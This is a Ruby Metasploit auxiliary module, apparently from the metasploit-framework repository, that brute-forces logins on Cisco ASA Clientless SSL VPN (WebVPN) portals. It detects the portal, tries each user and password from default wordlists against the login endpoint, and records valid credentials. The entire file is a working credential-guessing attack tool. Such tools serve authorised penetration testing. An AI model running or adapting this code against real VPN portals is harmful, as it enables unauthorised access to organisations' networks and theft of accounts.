##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/scanner/http/cisco_asa_asdm'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASA Clientless SSL VPN (WebVPN) Brute-force Login Utility',
        'Description' => %q{
          This module scans for Cisco ASA Clientless SSL VPN (WebVPN) web login portals and
          performs login brute-force to identify valid credentials.
        },
        'Author' => [
          'Jonathan Claudius <jclaudius[at]trustwave.com>', # original Metasploit module
          'jbaines-r7' # updated module
        ],
        'References' => [
          [ 'URL', 'https://www.cisco.com/c/en/us/support/docs/security-vpn/webvpn-ssl-vpn/119417-config-asa-00.html' ]
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptPath.new('USERPASS_FILE', [
          false, 'File containing users and passwords separated by space, one pair per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')
        ]),
        OptPath.new('USER_FILE', [
          false, 'File containing users, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_users.txt')
        ]),
        OptPath.new('PASS_FILE', [
          false, 'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')
        ])
      ]
    )
  end

  def run_host(_ip)
    # Establish the remote host is running the clientless vpn
    res = send_request_cgi('uri' => normalize_uri('/+CSCOE+/logon.html'))
    return unless res && res.code == 200 && res.get_cookies.include?('webvpn')

    print_status('The remote target appears to host Cisco SSL VPN Service. The moodule will continue.')
    print_status('Starting login brute force...')

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'Cisco ASA SSL VPN Service',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Brute-force the login page
  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
    res = send_request_cgi({
      'uri' => normalize_uri('/+webvpn+/index.html'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'cookie' => 'webvpnlogin=1',
      'vars_post' => {
        'tgroup' => '',
        'next' => '',
        'tgcookieset' => '',
        'username' => user,
        'password' => pass,
        'Login' => 'Login'
      }
    })

    # check if the user was likely forwarded to the clientless vpn page
    if res && res.code == 200 && res.body.include?('/+webvpn+/webvpn_logout.html') && res.body.include?('/+CSCOE+/session.js')

      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)

      # logout - the default vpn connection limit is 2 so it's best to free this one up
      send_request_cgi('uri' => normalize_uri('/+webvpn+/webvpn_logout.html'), 'cookie' => res.get_cookies)
      return :next_user
    else
      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end
  end
end
